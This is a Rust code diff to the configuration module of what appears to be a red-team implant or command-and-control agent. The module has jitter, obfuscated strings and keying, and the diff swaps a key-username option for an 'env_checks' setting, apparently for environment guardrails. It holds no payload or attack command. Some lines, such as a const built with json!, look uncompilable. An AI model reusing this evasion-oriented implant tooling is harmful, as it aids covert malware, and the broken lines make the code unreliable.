@@ -3,7 +3,7 @@ use std::io::{self, Write};
 use std::fs;
 use std::fmt;
 use serde::{Deserialize, Serialize};
-use serde_json::{Value, to_string, to_value};
+use serde_json::{Value, to_string, to_value, json};
 use base64::encode;
 use litcrypt::lc;
 
@@ -16,6 +16,7 @@ pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
 pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
 pub const CONFIG_FILE_PATH: &str = "./cfg.json";
 pub const DEFAULT_KEY_USERNAME: &str = "<<KEY_USERNAME>>";
+pub const DEFAULT_ENV_CHECKS: Value = json!([]);
 
 /// Enum for ConfigOptions, useful for parsing configs from 
 /// arbitrary data.
@@ -27,7 +28,7 @@ pub enum ConfigOption {
     LaunchApp(bool),
     ConfigPath(String),
     LogLevel(u64),
-    KeyUsername(String)
+    EnvChecks(Value)
 }
 
 
@@ -47,8 +48,8 @@ pub struct ConfigOptions {
     pub jitter_time: u64,
     pub launch_app: bool,
     pub log_level: u64,
-    pub key_username: String,
     pub config_file_path: String,
+    pub env_checks: Value
 }
 
 
@@ -76,7 +77,7 @@ impl ConfigOptions {
             config_file_path: j["config_file_path"].to_string().replace('"', ""),
             launch_app: j["launch_app"].as_bool().unwrap_or_default(),
             log_level: j["log_level"].as_u64().unwrap_or_else(|| 4), // Info as default log level
-            key_username: j["key_username"].to_string().replace('"', ""),
+            env_checks: j["env_checks"]
         }
     }
 
@@ -147,7 +148,7 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
             config_file_path: config_file_path.trim().to_string(),
             launch_app: false,
             log_level: log_level.trim().parse().unwrap(),
-            key_username: key_username.trim().to_string()
+            env_checks: json!([])
         }
     )
 }
@@ -162,7 +163,7 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
         config_file_path: CONFIG_FILE_PATH.to_string(),
         launch_app: true,
         log_level: DEFAULT_LOG_LEVEL.parse().unwrap_or_else(|_| 2),
-        key_username: DEFAULT_KEY_USERNAME.to_string()
+        env_checks: DEFAULT_ENV_CHECKS
     };
     
     Ok(config_options)
